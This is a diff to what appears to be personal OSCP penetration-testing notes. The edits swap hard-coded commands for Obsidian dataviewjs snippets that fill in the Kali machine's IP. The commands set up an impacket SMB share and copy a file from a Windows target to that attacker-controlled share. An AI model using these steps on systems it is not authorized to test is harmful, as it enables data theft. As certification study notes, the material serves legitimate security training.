@@ -32,8 +32,21 @@ impacket-smbserver share $(pwd) -smb2support -username kali -password kali
 ```
 
 Then on Windows:
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
+const command = `net use \\\\${KaliIP}\\share /user:kali kali`;
+
+dv.paragraph("```bash\n" + command + "\n```");
 ```
-net use \\192.168.45.186\share /user:kali kali
-copy C:\Path\To\File.txt \\192.168.45.186\share\
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `copy C:\\Path\\To\\File.txt \\\\${KaliIP}\\share\\`;
+
+dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+Reponse : 
+
+1 file copied.
